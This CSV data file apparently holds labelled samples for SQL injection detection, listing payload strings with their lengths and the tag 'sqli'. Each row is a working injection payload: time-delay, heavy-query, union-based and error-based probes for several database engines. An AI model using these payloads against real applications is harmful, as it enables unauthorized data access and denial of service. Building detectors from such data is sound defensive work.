payload,length,attack_type
"1%' or 8156=(select count(*) from generate_series(1,5000000))--",63,sqli
1')));begin dbms_lock.sleep(5); end and ((('xzbk'='xzbk,55,sqli
"1"")) or char(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null) and ((""isbh"" like ""isbh",132,sqli
"1))) and 8407=(select count(*) from generate_series(1,5000000)) and (((1729=1729",80,sqli
"1)) as mmby where 3990=3990 and 8312=dbms_pipe.receive_message(chr(69)||chr(79)||chr(101)||chr(68),5)--",103,sqli
"-1558 or elt(3306=2272,2272)-- ioxt",35,sqli
"-3758')) union all select 9460,9460,9460,9460,9460,9460,9460,9460--",67,sqli
1'))) and sleep(5) and ((('vbck' like 'vbck,43,sqli
"-9891"" union all select 7489#",29,sqli
"1%"")) and char(120)||char(106)||char(117)||char(85)=regexp_substring(repeat(right(char(9981),0),5000000000),null) and ((""%""=""",125,sqli
"1"";select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and ""rukx"" like ""rukx",114,sqli
-1700%' or 4149=3391#,21,sqli
"1"") where 1416=1416 union all select null,null,null#",52,sqli
1';select pg_sleep(5) and 'zfyy'='zfyy,38,sqli
"-2321%"") or 2271=7683--",23,sqli
"1%"" union all select null,null,null,null#",41,sqli
"1%"")) union all select null,null,null,null,null--",49,sqli
-4384'))) or 6872=6872 and ((('ukhl'='ukhl,42,sqli
-1886' where 5518=5518 or 4493=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4493=4493) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))--,222,sqli
"-4588"" union all select 4550,4550,4550,4550#",44,sqli
-6512'+(select 'zdjx' where 5454=5454 order by 1--,50,sqli
"1));iif(5257=5257,1,1/0)",24,sqli
"1')) as uvxv where 6663=6663 and 8514=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",124,sqli
"-2168"")) union all select 4935,4935,4935,4935,4935,4935,4935,4935,4935--",72,sqli
"1))) or 2367=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",111,sqli
"1%'))) or 6979=like('abcdefg',upper(hex(randomblob(500000000/2))))--",68,sqli
"1%"") and 9254=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",112,sqli
1')) as cjjm where 1981=1981;select (case when (4660=4660) then 4660 else cast(1 as int)/(select 0 from dual) end) from dual--,126,sqli
"-7813"")) as yvyl where 5172=5172 union all select 5172,5172#",60,sqli
"1')))(select (case when (4587=4587) then regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) else char(76)||char(65)||char(102)||char(72) end) from (values(0))) and ((('weof'='weof",222,sqli
1')) rlike (select * from (select(sleep(5)))sgvo) and (('krvo' like 'krvo,73,sqli
1') where 9175=9175;select case when 7634=3954 then 1 else null end--,69,sqli
"-1254"" or 4144=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4144=4144) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual)",237,sqli
1) and 2457=8146,16,sqli
-9148) where 2027=2027 or 8571=8571--,37,sqli
"1' in boolean mode) and elt(4249=4249,7259)#",44,sqli
-5067')) or 5903=('qqpjq'||(select case 5903 when 5903 then 1 else 0 end from rdb$database)||'qzvzq') and (('vkab' like 'vkab,125,sqli
"1) as nlig where 5964=5964 and 2388=benchmark(5000000,md5(0x6d457153))#",71,sqli
"1""))) and sleep(5) and (((""bvgg""=""bvgg",38,sqli
"1') as sagj where 4558=4558;select count(*) from generate_series(1,5000000)--",77,sqli
"1"") as hoiv where 9708=9708 and exp(~(select * from (select concat(0x7171706a71,(select (elt(8190=8190,1))),0x717a767a71,0x78))x))--",132,sqli
-6680') or 5483=3031 and ('zxes'='zxes,38,sqli
1'));waitfor delay '0:0:5' and (('nvqf'='nvqf,45,sqli
"1"" and elt(4249=4249,7259) and ""kgtz"" like ""kgtz",48,sqli
"-1196"")) or 1570=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (1570=1570) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and ((""srlq""=""srlq",222,sqli
1%' or sleep(5) and '%'=',25,sqli
"-9661""))) union all select 2158,2158,2158--",43,sqli
"1"")));(select * from (select(sleep(5)))acdk)#",45,sqli
"1') and 6414=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and ('mseo' like 'mseo",132,sqli
"1"")) union all select null,null,null#",37,sqli
-2316'))) or 8519=6010,22,sqli
1' and 9198=9198--,18,sqli
"1%' and char(107)||char(121)||char(97)||char(80)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",144,sqli
1' and 3754=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (3754=3754) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual) and 'foju'='foju,251,sqli
"1%""))) and 3754=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (3754=3754) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual) and (((""%""=""",251,sqli
"1' procedure analyse(extractvalue(9255,concat(0x5c,(benchmark(5000000,md5(0x52515a50))))),1) and 'gbpg'='gbpg",109,sqli
"1%"")));select count(*) from generate_series(1,5000000)--",56,sqli
"-8200' where 3422=3422 or 1570=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (1570=1570) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)))--",219,sqli
"1%"")));waitfor delay '0:0:5' and (((""%""=""",41,sqli
"-7806"")) or (8459=8459)*4906 and ((""vlrj"" like ""vlrj",52,sqli
1 where 6304=6304;begin dbms_lock.sleep(5); end--,49,sqli
"1'||(select 'dujx' where 6896=6896 and 2716=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",187,sqli
"-4285'))) union all select 8819,8819,8819,8819,8819,8819,8819,8819#",67,sqli
"1%') or (select 9173 from(select count(*),concat(0x7171706a71,(select (elt(9173=9173,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a) and ('%'='",185,sqli
"-3913"" where 6085=6085 union all select 6085,6085,6085,6085,6085,6085,6085#",75,sqli
"1')) as kxek where 3429=3429 or 6979=like('abcdefg',upper(hex(randomblob(500000000/2))))--",90,sqli
"-6580') union all select 9950,9950,9950,9950,9950,9950--",56,sqli
"1'||(select 'wtdz' from dual where 1866=1866 or 4915=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",139,sqli
"1',(select (case when (5586=6403) then 1 else 5586*(select 5586 from mysql.db) end))",84,sqli
"1%"") or 8315=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3) and (""%""=""",115,sqli
"-2860"")) order by 1#",20,sqli
"-7802'))) or elt(8778=9974,9974) and ((('glsq' like 'glsq",57,sqli
"-9318""))) union all select 5223,5223,5223,5223#",47,sqli
1')));waitfor delay '0:0:5' and ((('ozjl' like 'ozjl,52,sqli
"1';call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and 'ekhi'='ekhi",118,sqli
"1'))) or 7417=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",107,sqli
"1' or 5286=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)",98,sqli
"1""))) or 9643=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and (((""nthu"" like ""nthu",123,sqli
"-1908"")) union all select 4072,4072,4072,4072,4072,4072,4072,4072,4072,4072#",76,sqli
"-2745' or elt(1032=1032,3623)",29,sqli
"-3827"") or 8571=8571--",22,sqli
"1' where 7080=7080 or 8514=benchmark(5000000,md5(0x544d5a4c))#",62,sqli
"1',(select (case when (1609=1609) then waitfor delay '0:0:5' else 1609*(select 1609 from master..sysdatabases) end))",116,sqli
"1"")) and 7756=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (7756=7756) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and ((""fuus"" like ""fuus",231,sqli
-2348) as sige where 1639=1639 or 3440=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (3440=3440) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric)--,218,sqli
1'||(select 'sdll' where 5074=5074 or (select * from (select(sleep(5)))ydpu))||',80,sqli
"1'))) or updatexml(1808,concat(0x2e,0x7171706a71,(select (elt(1808=1808,1))),0x717a767a71),8666) and ((('yznn' like 'yznn",121,sqli
"-7235"") union all select 4624,4624,4624,4624,4624,4624,4624,4624,4624,4624#",75,sqli
"1"") as vcir where 6275=6275 and char(109)||char(79)||char(70)||char(90)=regexp_substring(repeat(right(char(5012),0),5000000000),null)--",135,sqli
"1%"") and char(109)||char(79)||char(70)||char(90)=regexp_substring(repeat(right(char(5012),0),5000000000),null)--",112,sqli
"1') where 4500=4500;iif(5257=5257,1,1/0)",40,sqli
"1%"")) rlike (select * from (select(sleep(5)))sgvo) and ((""%""=""",62,sqli
"1"");select (case when (4043=5276) then 4043 else 4043*(select 4043 from information_schema.character_sets) end)#",112,sqli
"1"")) as aamh where 7432=7432 (select (case when (5451=5451) then regexp_substring(repeat(right(char(5451),0),500000000),null) else char(108)||char(76)||char(112)||char(116) end) from information_schema.system_users)--",217,sqli
1' in boolean mode) and 4457=3885#,34,sqli
"1);create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5)",117,sqli
"-7233"") where 7574=7574 or 5821=3288",36,sqli
"1%') or 8514=benchmark(5000000,md5(0x544d5a4c))#",48,sqli
(case when 8422=8452 then 1 else null end),42,sqli
1';select case when 7426=6635 then 1 else null end--,52,sqli
"1%"")) and char(109)||char(79)||char(70)||char(90)=regexp_substring(repeat(right(char(5012),0),5000000000),null)--",113,sqli
"1%"") rlike (select * from (select(sleep(5)))vwyq)#",50,sqli
-9484' or (7129=2349)*2349 and 'fcsa' like 'fcsa,48,sqli
-6500')) or (8459=8459)*4906 and (('padu' like 'padu,52,sqli
"1%"")));begin dbms_lock.sleep(5); end--",38,sqli
1)) as sfan where 7176=7176 and 7017=7358,41,sqli
1') and 3754=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (3754=3754) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual) and ('izyf'='izyf,253,sqli
-3497' order by 1#,18,sqli
"-9136%"") union all select 3081,3081,3081,3081,3081,3081,3081#",61,sqli
"1"" where 3329=3329 or sleep(5)--",32,sqli
"1' in boolean mode);select like('abcdefg',upper(hex(randomblob(500000000/2))))--",80,sqli
"1) where 9432=9432 and 6510=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",171,sqli
"1"")) as ngvf where 9912=9912 or 7552=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",135,sqli
"1' or 5356=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",154,sqli
1%'));begin user_lock.sleep(5); end and (('%'=',47,sqli
"1')) as ezpq where 2976=2976 union all select null,null,null,null,null,null,null,null,null,null#",96,sqli
"1) procedure analyse(extractvalue(9627,concat(0x5c,(benchmark(5000000,md5(0x4b774c75))))),1)#",93,sqli
"-2102' where 3644=3644 or 5023=ctxsys.drithsx.sn(5023,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (5023=5023) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))--",219,sqli
1) as ywrn where 1893=1893;select (case when (6276=6276) then 6276 else 6276*(select 6276 from information_schema.character_sets) end)#,135,sqli
"1' or char(117)||char(111)||char(105)||char(100)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and 'nelb'='nelb",159,sqli
1' where 5455=5455 and sleep(5)--,33,sqli
"-6595))) union all select 2688,2688,2688,2688,2688,2688,2688,2688,2688,2688#",76,sqli
"-5210"") where 7176=7176 or 6872=6872--",38,sqli
"1""))) and (select * from (select(sleep(5)))gcrr)#",49,sqli
1) as mtnw where 7293=7293 and 2603=5764--,42,sqli
"1""))) and char(111)||char(77)||char(121)||char(88)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and (((""wute"" like ""wute",169,sqli
-7207' or 4747=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4747=4747) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and 'obxw'='obxw,225,sqli
"1) where 3062=3062 or 8466=benchmark(5000000,md5(0x694a4745))--",63,sqli
"1') and (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(3484=3484,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))) and ('fnjm'='fnjm",177,sqli
1')) and (select * from (select(sleep(5)))fzno) and (('tjvy' like 'tjvy,71,sqli
"-9737""))) order by 1--",22,sqli
"1');select dbms_pipe.receive_message(chr(112)||chr(70)||chr(106)||chr(78),5) from dual--",88,sqli
"1'+(select afst where 7454=7454 and 3202=like('abcdefg',upper(hex(randomblob(500000000/2)))))+'",95,sqli
"-8279"" union all select 6598,6598,6598,6598,6598,6598,6598,6598#",64,sqli
(select (case when (5792=5792) then 5792 else 1/(select 0) end)),64,sqli
"1') or exp(~(select * from (select concat(0x7171706a71,(select (elt(6270=6270,1))),0x717a767a71,0x78))x)) and ('efwq' like 'efwq",128,sqli
-9826 where 4103=4103 order by 1#,33,sqli
"1)) union all select null,null,null,null,null,null,null,null,null--",67,sqli
1'||(select 'ldad' where 6146=6146 rlike (select (case when (7689=7689) then 1 else 0x28 end)))||',98,sqli
"-9923%'))) union all select 8985,8985,8985,8985,8985,8985,8985#",63,sqli
"1"")));select (case when (4660=4660) then 4660 else cast(1 as int)/(select 0 from dual) end) from dual--",103,sqli
"1"") where 4849=4849 or 8421=(select count(*) from generate_series(1,5000000))--",79,sqli
"1'||(select 'qued' where 9801=9801 procedure analyse(extractvalue(9627,concat(0x5c,(benchmark(5000000,md5(0x4b774c75))))),1)#",125,sqli
"1) where 7026=7026;call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",119,sqli
-5708 where 3134=3134 or 5903=('qqpjq'||(select case 5903 when 5903 then 1 else 0 end from rdb$database)||'qzvzq')--,116,sqli
"1 procedure analyse(extractvalue(9627,concat(0x5c,(benchmark(5000000,md5(0x4b774c75))))),1)#",92,sqli
"1)) union all select null,null,null,null,null,null,null,null,null,null#",71,sqli
"1')) as wkys where 2478=2478 and 6055=ctxsys.drithsx.sn(6055,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (6055=6055) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))--",226,sqli
"1))) or 7417=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",106,sqli
"1')) or (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(8113=8113,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))) and (('gyre'='gyre",178,sqli
"-8472') where 3340=3340 or make_set(1752=9905,9905)--",53,sqli
"1')) as lmsl where 3753=3753 or elt(5873=5873,sleep(5))#",56,sqli
"1))) and 2716=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",157,sqli
"1') and 3202=like('abcdefg',upper(hex(randomblob(500000000/2))))",64,sqli
-2679'))) or 4747=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4747=4747) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and ((('cutk' like 'cutk,236,sqli
"1)) and 8189=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",106,sqli
1'||(select 'jmhb' where 1794=1794 or 4240=(select 4240 from pg_sleep(5))--,75,sqli
1));select (case when (4769=4769) then 4769 else 4769*(select 4769 from mysql.db) end)#,87,sqli
"1' in boolean mode);call regexp_substring(repeat(right(char(3702),0),500000000),null)#",86,sqli
"1';call regexp_substring(repeat(right(char(3702),0),500000000),null) and 'pczr'='pczr",85,sqli
"-4797' union all select 8223,8223,8223,8223,8223,8223,8223,8223#",64,sqli
"-8709"" or 8571=8571--",21,sqli
"1%""))) or 4411=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and (((""%""=""",169,sqli
"1"") and (select * from (select(sleep(5)))fzno) and (""zvew"" like ""zvew",69,sqli
1);(select * from (select(sleep(5)))srmq) and (9069=9069,56,sqli
1)) as prxq where 4600=4600;(select * from (select(sleep(5)))acdk)#,67,sqli
-3596))) or 5903=('qqpjq'||(select case 5903 when 5903 then 1 else 0 end from rdb$database)||'qzvzq') and (((3645=3645,118,sqli
"1)) as eigk where 2557=2557;select count(*) from generate_series(1,5000000)--",77,sqli
"1') where 8163=8163;select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3--",104,sqli
"-2899"")) as uyoc where 8417=8417 union all select 8417,8417,8417,8417--",71,sqli
"1%') and 8148=like('abcdefg',upper(hex(randomblob(500000000/2))))--",67,sqli
-5569') as cjaf where 3753=3753 union all select 3753#,54,sqli
"1'+(select inrv where 2178=2178 or 7417=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",133,sqli
1);if(4735=8907) select 4735 else drop function qigo--,54,sqli
"1') or 5286=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) and ('cqrp'='cqrp",117,sqli
"1"") or char(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null) and (""xmrq""=""xmrq",125,sqli
"1') as noqp where 4042=4042 or 8315=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",129,sqli
